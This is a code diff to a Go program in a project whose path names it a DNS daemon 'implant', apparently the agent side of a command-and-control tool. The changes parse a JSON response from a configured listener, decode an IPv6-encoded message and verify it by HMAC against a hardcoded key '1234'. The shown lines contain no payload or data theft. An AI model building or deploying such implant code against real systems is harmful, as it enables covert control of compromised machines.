@@ -16,13 +16,9 @@ import (
 	"github.com/matt-culbert/dns-daemon/implant/shared"
 )
 
-// Function to load configuration from embedded JSON
-func loadConfig() (Config, error) {
-	var config Config
-	if err := json.Unmarshal(configData, &config); err != nil {
-		return Config{}, err
-	}
-	return config, nil
+type ResponseData struct {
+	Message string `json:"message"`
+	Key     string `json:"key"`
 }
 
 //go:embed config.json
@@ -33,6 +29,15 @@ type Config struct {
 	listener string `json:"listener"`
 	id       string `json:"id"`
 	sleep    string `json:"sleep"`
+}
+
+// Function to load configuration from embedded JSON
+func loadConfig() (Config, error) {
+	var config Config
+	if err := json.Unmarshal(configData, &config); err != nil {
+		return Config{}, err
+	}
+	return config, nil
 }
 
 func main() {
@@ -87,22 +92,27 @@ func main() {
 	}
 	fmt.Println("body read")
 
-	// Print the response status and body
-	fmt.Println("Response Status:", resp.Status)
-	fmt.Println("Response Body:", string(body))
-
-	decoded, _ := shared.DecodeIPv6ToString(string(body))
-	fmt.Println("Decoded string:", decoded)
-	fmt.Println(localHash)
+	// Parse the JSON response
+	var data ResponseData
+	_ = json.Unmarshal(body, &data)
 	/*
-		// Example message and HMAC to verify
-		message := "Hello, World!"
-		receivedHMAC := "ab4bc3d4e2f29c6f" // Replace with actual HMAC in hex or base64 format
-
-		if shared.VerifyMessageWithHMAC(message, receivedHMAC, localHash) {
-			fmt.Println("HMAC is valid!")
-		} else {
-			fmt.Println("HMAC is invalid or message was tampered with.")
+		if err != nil {
+			log.Fatalf("Failed to parse JSON response: %v", err)
 		}
 	*/
+	// Print the values (for testing)
+	fmt.Println("Message:", data.Message)
+	fmt.Println("Key:", data.Key)
+
+	decoded, _ := shared.DecodeIPv6ToString(string(data.Message))
+	fmt.Println("Decoded string:", decoded)
+	fmt.Println(localHash)
+
+	// Verify the message with the received HMAC
+	if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte("1234")) {
+		fmt.Println("HMAC is valid!")
+	} else {
+		fmt.Println("HMAC is invalid or message was tampered with.")
+	}
+
 }
